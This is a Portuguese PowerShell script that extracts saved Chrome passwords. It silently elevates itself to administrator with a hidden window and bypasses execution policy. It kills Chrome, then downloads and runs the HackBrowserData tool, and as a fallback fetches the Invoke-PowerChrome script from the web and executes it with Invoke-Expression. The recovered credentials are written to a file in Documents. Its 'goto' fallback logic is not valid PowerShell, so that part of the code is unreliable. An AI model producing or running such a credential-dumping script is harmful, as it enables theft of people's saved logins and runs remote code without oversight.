# ExtrairSenhas.ps1 - Versão CORRIGIDA

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

Write-Host "=== INICIANDO EXTRACAO DE SENHAS ===" -ForegroundColor Cyan

# Fecha o Chrome para liberar os arquivos
Write-Host "Fechando Chrome..." -ForegroundColor Yellow
Get-Process "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2

# Define o caminho de saída
$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDocuments "senhas_chrome_$datahora.txt"

# ========== MÉTODO 1: HackBrowserData ==========
Write-Host "Tentando HackBrowserData..." -ForegroundColor Cyan

$tempDir = "C:\Windows\Temp\HBD"
$zipPath = "$tempDir\hbd.zip"
$exePath = "$tempDir\hack-browser-data.exe"
$outputDir = "$tempDir\output"

# Cria pastas
if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
New-Item -ItemType Directory -Path $outputDir -Force | Out-Null

# Baixa o executável (versão 0.4.6 - mais recente)
Write-Host "Baixando HackBrowserData..." -ForegroundColor Yellow
$url = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"

try {
    Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
    Write-Host "Download concluído!" -ForegroundColor Green
} catch {
    Write-Host "ERRO no download: $_" -ForegroundColor Red
    "ERRO: Falha ao baixar a ferramenta." | Out-File -FilePath $arquivoSaida -Encoding UTF8
    goto metodo2
}

# Extrai
Write-Host "Extraindo..." -ForegroundColor Yellow
try {
    Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force -ErrorAction Stop
    Write-Host "Extração concluída!" -ForegroundColor Green
} catch {
    Write-Host "ERRO na extração: $_" -ForegroundColor Red
    goto metodo2
}

# Verifica se o EXE existe
if (-not (Test-Path $exePath)) {
    Write-Host "Procurando executável..." -ForegroundColor Yellow
    $exeEncontrado = Get-ChildItem -Path $tempDir -Filter "*.exe" -Recurse | Select-Object -First 1
    if ($exeEncontrado) {
        $exePath = $exeEncontrado.FullName
        Write-Host "EXE encontrado em: $exePath" -ForegroundColor Green
    } else {
        Write-Host "ERRO: Executável não encontrado!" -ForegroundColor Red
        goto metodo2
    }
}

# Executa a extração
Write-Host "Extraindo senhas (pode levar alguns segundos)..." -ForegroundColor Yellow
try {
    # Executa o comando
    & $exePath -b chrome -f csv --dir $outputDir 2>&1 | Out-Null
    Start-Sleep -Seconds 3
    
    # Procura o arquivo CSV gerado
    $csvFile = Get-ChildItem -Path $outputDir -Filter "*password*.csv" -ErrorAction SilentlyContinue | Select-Object -First 1
    
    if ($csvFile -and (Test-Path $csvFile.FullName)) {
        Copy-Item $csvFile.FullName $arquivoSaida -Force
        Write-Host "SUCESSO! Senhas salvas em: $arquivoSaida" -ForegroundColor Green
        
        # Limpeza
        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
        exit
    } else {
        Write-Host "Nenhum arquivo CSV encontrado." -ForegroundColor Yellow
    }
} catch {
    Write-Host "ERRO ao executar: $_" -ForegroundColor Red
}

# ========== MÉTODO 2: PowerChrome (Fallback) ==========
:metodo2
Write-Host "Tentando método alternativo (PowerChrome)..." -ForegroundColor Cyan

try {
    $script = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' -ErrorAction Stop
    Invoke-Expression $script
    $output = Invoke-PowerChrome -Browser Chrome 2>&1
    
    # Filtra apenas as linhas com dados úteis
    $linhasUteis = $output | Where-Object { 
        $_ -match "https?://" -or 
        $_ -match "@" -or 
        ($_ -match "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
    }
    
    if ($linhasUteis.Count -gt 0) {
        $linhasUteis | Out-File -FilePath $arquivoSaida -Encoding UTF8
        Write-Host "SUCESSO! Senhas extraídas via PowerChrome." -ForegroundColor Green
    } else {
        "Nenhuma senha encontrada no Chrome." | Out-File -FilePath $arquivoSaida -Encoding UTF8
        Write-Host "Nenhuma senha encontrada." -ForegroundColor Yellow
    }
} catch {
    Write-Host "ERRO no PowerChrome: $_" -ForegroundColor Red
    "ERRO completo: $($_.Exception.Message)" | Out-File -FilePath $arquivoSaida -Encoding UTF8
}

# Limpeza final
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "Processo concluído!" -ForegroundColor Cyan
Start-Sleep -Seconds 2
exit
